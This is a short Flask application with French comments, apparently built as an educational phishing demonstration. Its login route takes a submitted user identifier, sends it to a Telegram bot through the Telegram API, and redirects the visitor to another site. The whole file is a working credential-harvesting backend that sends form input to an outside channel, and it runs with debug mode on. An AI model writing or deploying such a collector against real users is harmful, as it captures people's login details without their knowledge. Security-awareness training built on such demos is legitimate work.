from dotenv import load_dotenv

load_dotenv()
from flask import Flask, render_template, request, redirect
import requests
import os

app = Flask(__name__)

# Chargement des variables d'environnement depuis le fichier .env
TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("CHAT_ID")

# Vérifie si les variables sont bien chargées
if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    raise ValueError("Les variables d'environnement BOT_TOKEN et CHAT_ID ne sont pas définies dans .env")


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant')

        if not identifiant:  # Vérifie que l'identifiant a bien été envoyé
            return "Identifiant manquant", 400  # Retourne une erreur si l'identifiant est vide

        # Envoi du message à Telegram
        message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}

        # Envoi de la requête POST à Telegram
        response = requests.post(url, data=payload)

        # Vérification de la réponse pour s'assurer que le message a bien été envoyé
        if response.status_code != 200:
            return f"Erreur lors de l'envoi du message Telegram : {response.text}", 500

        # Redirection vers Google ou autre site
        return redirect("https://code-s-curit-qxie.onrender.com/")

    return render_template('login.html')


if __name__ == '__main__':
    app.run(debug=True)
